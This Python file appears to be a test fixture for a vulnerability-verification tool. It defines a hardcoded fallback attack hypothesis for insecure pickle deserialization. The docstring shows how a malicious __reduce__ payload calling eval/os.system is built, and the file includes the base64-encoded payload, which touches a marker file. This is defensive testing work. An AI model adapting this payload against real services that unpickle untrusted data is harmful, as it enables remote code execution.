"""Hardcoded fallback AttackHypothesis for the third (insecure
deserialization) fixture. Same purpose as fallback.py/sql_fallback.py:
used when Groq is unreachable/rate-limited so the demo never dies on a
live LLM call.

The payload is a base64-encoded pickle stream whose `__reduce__` calls
`eval(...)` on unpickling - generated once via:
    import pickle, base64
    class Exploit:
        def __reduce__(self):
            return (eval, ("__import__('os').system('touch /tmp/kagutsuchi_pwned')",))
    base64.b64encode(pickle.dumps(Exploit())).decode("ascii")

Deliberately reduces to `eval` (a builtin, pickled under the stable
`builtins` module on every platform) rather than `os.system` directly:
`os.system.__module__` is the platform-specific submodule Python's `os`
re-exports it from (`nt` on Windows, `posix` on Linux/macOS), so a payload
built by pickling `os.system` directly fails to unpickle on a different
platform than it was generated on (`ModuleNotFoundError: No module named
'nt'` when a Windows-generated payload is unpickled in the Linux sandbox -
caught by testing this fixture against the real Docker sandbox, not just
locally). Routing through `eval` sidesteps the whole platform-module
question.
"""

from __future__ import annotations

from verification.models import AttackHypothesis

DESERIALIZATION_FALLBACK_HYPOTHESIS = AttackHypothesis(
    hypothesis_id="fallback-insecure-deserialization-0001",
    finding_id="",  # filled in by the caller from the real SecurityFinding
    security_property="no arbitrary code execution via pickle.loads() on the data parameter",
    attack_vector=(
        "data is base64-decoded and passed straight to pickle.loads(); a "
        "crafted __reduce__ method lets the payload call any callable with "
        "any arguments during unpickling, not just produce unexpected data"
    ),
    payload="gASVUgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw2X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ3RvdWNoIC90bXAva2FndXRzdWNoaV9wd25lZCcplIWUUpQu",
    expected_if_vulnerable=(
        "filesystem_diff shows /tmp/kagutsuchi_pwned created (the "
        "unpickled __reduce__ ran os.system('touch ...') as arbitrary code)"
    ),
    expected_if_safe=(
        "/tmp/kagutsuchi_pwned is never created; json.loads() either "
        "raises a decode error on the non-UTF-8 pickle bytes or returns "
        "inert plain data, never executes anything"
    ),
    generated_by="fallback:hardcoded-v1",
)


def with_finding_id(finding_id: str) -> AttackHypothesis:
    return DESERIALIZATION_FALLBACK_HYPOTHESIS.model_copy(update={"finding_id": finding_id})
